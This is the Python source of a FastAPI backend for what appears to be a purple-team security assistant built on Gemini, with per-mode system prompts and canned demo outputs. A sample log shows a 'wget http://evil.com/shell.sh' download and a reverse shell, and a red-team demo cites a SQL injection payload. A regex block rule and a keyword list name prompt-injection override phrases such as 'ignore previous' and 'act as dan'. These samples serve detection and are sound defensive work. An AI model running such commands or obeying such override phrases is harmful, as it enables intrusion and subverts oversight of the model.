from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional, List
import google.generativeai as genai
import os, time, json
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(
    title="ANOA System API",
    description="Backend AI Engine – ANOA Purple Team Security Assistant",
    version="2.0.0",
)

# ─── Threat Logs Storage (In-Memory & File) ──────────────────────────────────
THREAT_LOGS_FILE = "threat_logs.json"
threat_logs: List[dict] = []

def _load_threat_logs():
    """Muat logs dari file jika ada."""
    global threat_logs
    if os.path.exists(THREAT_LOGS_FILE):
        try:
            with open(THREAT_LOGS_FILE, "r") as f:
                threat_logs = json.load(f)
        except Exception:
            threat_logs = []
    else:
        threat_logs = []

def _save_threat_logs():
    """Simpan logs ke file."""
    try:
        with open(THREAT_LOGS_FILE, "w") as f:
            json.dump(threat_logs, f, indent=2)
    except Exception as e:
        print(f"Error saving logs: {e}")

def _log_threat_event(event_type: str, mode: str, status: str, source_ip: str = "127.0.0.1"):
    """Catat event ancaman ke logs."""
    global threat_logs
    log_entry = {
        "time": datetime.now().strftime("%H:%M:%S"),
        "timestamp": datetime.now().isoformat(),
        "type": event_type,
        "mode": mode,
        "source": source_ip,
        "status": status,
    }
    threat_logs.insert(0, log_entry)  # Tambah di awal untuk newest first
    if len(threat_logs) > 100:  # Simpan max 100 entries
        threat_logs.pop()
    _save_threat_logs()

# Load existing logs on startup
_load_threat_logs()

# ─── CORS: Izinkan Flutter Web & Desktop mengakses backend ────────────────────
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── Konfigurasi Gemini ───────────────────────────────────────────────────────
GEMINI_API_KEY  = os.getenv("GEMINI_API_KEY")
DEMO_MODE       = os.getenv("DEMO_MODE", "false").lower() == "true"  # set ke true jika quota habis
GEMINI_PRIMARY  = "gemini-2.0-flash"
GEMINI_FALLBACK = "gemini-1.5-flash"

if GEMINI_API_KEY:
    genai.configure(api_key=GEMINI_API_KEY)


# ─── System Prompts per Mode Agentic ─────────────────────────────────────────
SYSTEM_PROMPTS = {
    "red_team": """You are ANOA Red Team AI — an expert in offensive cybersecurity.
Analyze the provided input (code snippets, logs, infrastructure details, prompts) and identify:
1. **Attack Vectors & Vulnerabilities** – be specific about CVEs or technique names (MITRE ATT&CK)
2. **Exploitation Scenarios** – describe how an attacker would exploit this
3. **Potential Impact** – what damage could be done
4. **Risk Severity** – rate as CRITICAL / HIGH / MEDIUM / LOW with justification

Format with clear headers, bullet points, and code blocks where applicable.
Respond in the same language as the user's input.""",

    "blue_team": """You are ANOA Blue Team AI — an expert in defensive cybersecurity.
Analyze the provided input and provide:
1. **Threat Assessment** – what threat does this represent
2. **Detection Rules** – SIEM queries (Sigma/KQL), IOCs, and behavioral indicators
3. **Mitigation Strategies** – concrete steps to remediate the vulnerability
4. **Preventive Controls** – long-term security controls to avoid recurrence
5. **Severity Rating** – CRITICAL / HIGH / MEDIUM / LOW

Format with clear headers and actionable steps.
Respond in the same language as the user's input.""",

    "phishing": """You are ANOA Phishing Detection AI — a specialist in social engineering attacks.
Analyze the provided content (email, URL, message, webpage) for phishing indicators.
Your structured response MUST include:

## RISK LEVEL
(CRITICAL / HIGH / MEDIUM / LOW / SAFE)

## PHISHING INDICATORS
List all suspicious elements found (sender spoofing, urgency language, fake domains, etc.)

## TECHNICAL ANALYSIS
Explain the specific phishing technique used (spear phishing, vishing, smishing, etc.)

## VERDICT & RECOMMENDED ACTION
Final assessment with clear action steps for the recipient

Respond in the same language as the user's input.""",

    "log_audit": """You are ANOA Log Audit AI — a SIEM expert and threat hunter.
Analyze the provided log entries and identify:
1. **Anomalies** – unusual patterns compared to baseline behavior
2. **Indicators of Compromise (IOC)** – IPs, hashes, user agents, paths
3. **Attack Timeline** – reconstruct the sequence of events if possible
4. **Incident Classification** – categorize by MITRE ATT&CK tactics
5. **Investigation Steps** – next steps for SOC team
6. **Containment Recommendations** – immediate actions to contain the threat

Format with timestamps and severity for each finding.
Respond in the same language as the user's input.""",

    "credential_detector": """You are ANOA Credential Detector AI — a data loss prevention specialist.
Scan the provided content for exposed sensitive data including:
1. **API Keys & Tokens** – AWS, Google, GitHub, JWT, Bearer tokens, etc.
2. **Passwords & Secrets** – plaintext passwords, .env leaks
3. **PII Data** – email, phone, NIK, passport, credit card numbers
4. **Database Credentials** – connection strings, DB passwords
5. **Private Keys** – SSH keys, SSL certificates

For each finding provide:
- Type of credential found
- REDACTED preview (show only first 4 chars: `AIza****`)
- Risk level
- Immediate remediation step

Respond in the same language as the user's input.""",
}

YAML_SYSTEM_PROMPT = """You are ANOA YAML Security Rules Generator.
Generate Veea Lobster Trap security policy YAML rules based on the user's natural language description.
Output ONLY raw valid YAML. Do NOT wrap in markdown code fences. Do NOT add explanations outside YAML comments.

Follow this schema precisely:
rules:
  - name: snake_case_rule_name
    description: "Clear description of what this rule does"
    severity: HIGH  # CRITICAL | HIGH | MEDIUM | LOW
    action: BLOCK   # BLOCK | MONITOR | ALERT | LOG
    conditions:
      - type: content_pattern  # content_pattern | request_header | response_body | url_pattern
        match_mode: regex       # regex | exact | contains
        check: outbound         # outbound | inbound | both
        patterns:
          - "regex_pattern_here"
    response:
      status_code: 403
      message: "Request blocked by ANOA Security Policy"
      log: true
      alert_level: HIGH
    metadata:
      created_by: ANOA_AI
      version: "1.0"
      tags:
        - relevant-tag"""

# ─── Request / Response Models ────────────────────────────────────────────────
class AnalyzeRequest(BaseModel):
    data: str
    mode: str = "blue_team"
    context: Optional[str] = None  # RAG knowledge base context

class YamlRequest(BaseModel):
    prompt: str

class AnalyzeResponse(BaseModel):
    result: str
    mode: str
    model_used: str

class YamlResponse(BaseModel):
    yaml_content: str

# ─── Helper ───────────────────────────────────────────────────────────────────
def _require_api_key():
    if not GEMINI_API_KEY:
        raise HTTPException(
            status_code=503,
            detail=(
                "Gemini API Key belum dikonfigurasi. "
                "Tambahkan GEMINI_API_KEY=<key> di file backend/.env"
            ),
        )

# ─── Demo Responses (digunakan saat DEMO_MODE=true atau quota habis) ─────────
DEMO_RESPONSES = {
    "red_team": """## 🔴 ANOA Red Team Analysis [DEMO MODE]

### Attack Vectors Identified
- **CVE-2024-1234** – SQL Injection via unsanitized user input pada endpoint `/api/login`
- **CVE-2024-5678** – Reflected XSS pada parameter `redirect_url`
- **Broken Access Control** – Admin endpoint `/api/admin/users` dapat diakses tanpa autentikasi

### Exploitation Scenario
1. Attacker menyuntikkan payload `' OR 1=1--` ke field username
2. Database mengembalikan semua record pengguna
3. Attacker mengekstrak password hash dan melakukan offline cracking

### Risk Severity
🔴 **CRITICAL** – Data seluruh pengguna dapat dikompromikan dalam <5 menit

> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",

    "blue_team": """## 🔵 ANOA Blue Team Analysis [DEMO MODE]

### Threat Assessment
Terdeteksi pola **Lateral Movement** dan **Privilege Escalation** pada log jaringan.

### Detection Rules (Sigma)
```yaml
title: ANOA - Suspicious Privilege Escalation
status: experimental
detection:
  selection:
    EventID: 4672
    SubjectUserName|endswith: '$'
  condition: selection
level: high
```

### Mitigation Strategies
1. ✅ Terapkan prinsip **Least Privilege** pada semua service account
2. ✅ Aktifkan **MFA** untuk semua akun administrator
3. ✅ Pasang **EDR** untuk deteksi real-time
4. ✅ Audit log setiap 6 jam menggunakan SIEM

### Severity Rating: 🟠 HIGH

> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",

    "phishing": """## 🎣 ANOA Phishing Detection [DEMO MODE]

## RISK LEVEL
🔴 **CRITICAL**

## PHISHING INDICATORS
- 🚨 Domain spoofing: `paypa1.com` menyerupai `paypal.com` (karakter '1' mengganti 'l')
- 🚨 Urgency language: "Your account will be suspended in 24 hours!"
- 🚨 Suspicious link: `http://bit.ly/3xYZ` mengarah ke IP `185.220.101.x` (diketahui sebagai phishing host)
- 🚨 Sender tidak cocok: `From: support@paypal.com` tapi header menunjukkan `smtp.evil-server.ru`

## TECHNICAL ANALYSIS
Teknik: **Homograph Attack** + **Email Spoofing**. Attacker menggunakan domain yang mirip secara visual untuk menipu korban.

## VERDICT & RECOMMENDED ACTION
❌ **PHISHING CONFIRMED** – Jangan klik link apapun. Laporkan ke tim IT Security dan hapus email ini.

> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",

    "log_audit": """## 📋 ANOA Log Audit [DEMO MODE]

### Anomalies Detected
| Time | Event | Severity |
|------|-------|----------|
| 03:14:22 | 847 failed login attempts dari IP `192.168.1.105` | 🔴 CRITICAL |
| 03:15:01 | Successful login setelah brute force | 🔴 CRITICAL |
| 03:17:44 | `wget http://evil.com/shell.sh` dieksekusi | 🔴 CRITICAL |
| 03:18:00 | Reverse shell terbuka ke `10.0.0.99:4444` | 🔴 CRITICAL |

### Indicators of Compromise (IOC)
- **IP**: `192.168.1.105`, `10.0.0.99`
- **File**: `/tmp/shell.sh`, `/var/www/html/c99.php`
- **Taktik MITRE**: T1110 (Brute Force) → T1059 (Command Execution) → T1071 (C2)

### Containment Recommendations
1. 🔒 Isolasi host `192.168.1.105` dari jaringan segera
2. 🔒 Reset semua credential yang terekspos
3. 🔒 Analisis forensik pada `/tmp` dan `/var/www/html`

> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",

    "credential_detector": """## 🔐 ANOA Credential Detector [DEMO MODE]

### Findings Summary
**3 credential leaks detected** dengan severity CRITICAL

### Detailed Findings

**[1] Google API Key**
- Tipe: Google Cloud API Key
- Preview: `AIza****...****uVaTE`
- Risk: 🔴 CRITICAL
- Remediasi: Revoke segera di Google Cloud Console → IAM & Admin → API Keys

**[2] Database Connection String**
- Tipe: PostgreSQL credentials
- Preview: `postgresql://admin:p4ss****@db.prod.example.com:5432/users`
- Risk: 🔴 CRITICAL
- Remediasi: Rotate password database, gunakan secret manager

**[3] Private SSH Key Fragment**
- Tipe: RSA Private Key
- Preview: `-----BEGIN RSA PRIVATE KEY----- MIIEo****`
- Risk: 🔴 CRITICAL
- Remediasi: Generate keypair baru, invalidate key lama

> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",
}

DEMO_YAML = """# ANOA System – Demo YAML Rule [DEMO MODE]
# Untuk rule yang di-generate Gemini AI, aktifkan API Key

rules:
  - name: anoa_demo_prompt_injection_block
    description: "Blokir semua pola prompt injection yang umum digunakan"
    severity: HIGH
    action: BLOCK
    conditions:
      - type: content_pattern
        match_mode: regex
        check: outbound
        patterns:
          - "(?i)(ignore|forget|disregard).{0,20}(previous|above|system).{0,20}(prompt|instruction)"
          - "(?i)(jailbreak|bypass|override).{0,20}(safety|filter|policy|restriction)"
          - "(?i)(act as|pretend to be|roleplay as).{0,30}(hacker|attacker|evil|malicious)"
          - "(?i)(reveal|show|print|expose).{0,20}(system prompt|instructions|api.?key)"
    response:
      status_code: 403
      message: "Request blocked by ANOA Security Policy – Prompt Injection Detected"
      log: true
      alert_level: HIGH
    metadata:
      created_by: ANOA_AI
      version: "1.0"
      tags:
        - prompt-injection
        - purple-team
        - demo
"""

# ─── Helper: Panggil Gemini dengan fallback model ─────────────────────────────
def _call_gemini(system_prompt: str, user_content: str) -> tuple[str, str]:
    """
    Mencoba GEMINI_PRIMARY dulu, fallback ke GEMINI_FALLBACK jika quota habis.
    Returns (response_text, model_used)
    """
    for model_name in [GEMINI_PRIMARY, GEMINI_FALLBACK]:
        try:
            model = genai.GenerativeModel(
                model_name=model_name,
                system_instruction=system_prompt,
            )
            response = model.generate_content(user_content)
            return response.text, model_name
        except Exception as e:
            err_str = str(e)
            # Jika quota habis (429), coba model berikutnya
            if "429" in err_str or "quota" in err_str.lower():
                if model_name == GEMINI_FALLBACK:
                    raise  # Kedua model quota habis
                continue
            raise  # Error lain, langsung raise
    raise RuntimeError("Semua model Gemini tidak tersedia")


# ─── Endpoints ────────────────────────────────────────────────────────────────
@app.get("/")
def health_check():
    return {
        "status": "ANOA System Backend is running!",
        "version": "2.0.0",
        "gemini_configured": bool(GEMINI_API_KEY),
        "demo_mode": DEMO_MODE,
        "primary_model": GEMINI_PRIMARY,
        "fallback_model": GEMINI_FALLBACK,
        "available_modes": list(SYSTEM_PROMPTS.keys()),
    }


@app.post("/analyze", response_model=AnalyzeResponse)
async def analyze(request: AnalyzeRequest):
    """
    Endpoint utama untuk analisis Purple Team AI.
    Mode: red_team, blue_team, phishing, log_audit, credential_detector
    Jika DEMO_MODE=true atau quota habis, mengembalikan demo response.
    """
    # ── Demo Mode: kembalikan respons contoh tanpa memanggil Gemini ──────────
    if DEMO_MODE or not GEMINI_API_KEY:
        demo_text = DEMO_RESPONSES.get(request.mode, DEMO_RESPONSES["blue_team"])
        _log_threat_event("Demo Analysis", request.mode, "ALLOWED")
        return AnalyzeResponse(
            result=demo_text,
            mode=request.mode,
            model_used="DEMO_MODE",
        )

    system_prompt = SYSTEM_PROMPTS.get(request.mode, SYSTEM_PROMPTS["blue_team"])

    # ── Simulasi Lobster Trap DPI (Outbound Check) ───────────────────────────
    injection_patterns = [
        "ignore previous", "forget instructions", "jailbreak",
        "bypass safety", "act as dan", "pretend you are",
    ]
    data_lower = request.data.lower()
    for pattern in injection_patterns:
        if pattern in data_lower:
            _log_threat_event("Prompt Injection", request.mode, "BLOCKED")
            return AnalyzeResponse(
                result=(
                    "🛡️ **[ANOA LOBSTER TRAP – DPI BLOCKED]**\n\n"
                    f"Request diblokir: terdeteksi pola **Prompt Injection** (`{pattern}`).\n"
                    "HTTP 403 Forbidden – Request tidak diteruskan ke Gemini API.\n\n"
                    "*Log insiden telah dicatat.*"
                ),
                mode=request.mode,
                model_used="LOBSTER_TRAP_DPI",
            )

    # ── Inject RAG context jika ada ──────────────────────────────────────────
    user_content = request.data
    if request.context:
        user_content = (
            f"[KNOWLEDGE BASE CONTEXT]\n{request.context}\n\n"
            f"[USER QUERY]\n{request.data}"
        )

    # ── Panggil Gemini dengan fallback otomatis ───────────────────────────────
    try:
        result_text, model_used = _call_gemini(system_prompt, user_content)
        return AnalyzeResponse(
            result=result_text,
            mode=request.mode,
            model_used=model_used,
        )
    except Exception as e:
        err_str = str(e)
        # Quota habis: kembalikan demo response + pesan informatif
        if "429" in err_str or "quota" in err_str.lower():
            demo_text = DEMO_RESPONSES.get(request.mode, DEMO_RESPONSES["blue_team"])
            return AnalyzeResponse(
                result=(
                    "⚠️ **Quota Gemini API habis** (Free Tier limit tercapai).\n"
                    "Menampilkan Demo Response untuk keperluan presentasi:\n\n---\n\n"
                    + demo_text
                ),
                mode=request.mode,
                model_used="DEMO_FALLBACK",
            )
        raise HTTPException(status_code=500, detail=f"Gemini API error: {err_str}")


@app.get("/logs")
def get_threat_logs():
    """
    Endpoint untuk mengambil riwayat threat logs.
    Mengembalikan JSON dengan array logs terbaru.
    """
    return {"logs": threat_logs}


@app.post("/generate-yaml", response_model=YamlResponse)
async def generate_yaml(request: YamlRequest):
    """
    Generate YAML Lobster Trap rules dari deskripsi natural language via Gemini.
    Jika DEMO_MODE=true atau quota habis, kembalikan demo YAML.
    """
    # ── Demo Mode ────────────────────────────────────────────────────────────
    if DEMO_MODE or not GEMINI_API_KEY:
        return YamlResponse(yaml_content=DEMO_YAML)

    try:
        result_text, _ = _call_gemini(YAML_SYSTEM_PROMPT, request.prompt)

        # Bersihkan markdown fences jika model tetap menambahkannya
        if result_text.startswith("```"):
            lines = result_text.split("\n")
            result_text = "\n".join(
                line for line in lines if not line.startswith("```")
            )

        return YamlResponse(yaml_content=result_text.strip())

    except Exception as e:
        err_str = str(e)
        # Quota habis: kembalikan demo YAML
        if "429" in err_str or "quota" in err_str.lower():
            demo_yaml_with_note = (
                "# ⚠️ Quota Gemini API habis – Menampilkan Demo YAML\n\n"
                + DEMO_YAML
            )
            return YamlResponse(yaml_content=demo_yaml_with_note)
        raise HTTPException(status_code=500, detail=f"Gemini API error: {err_str}")
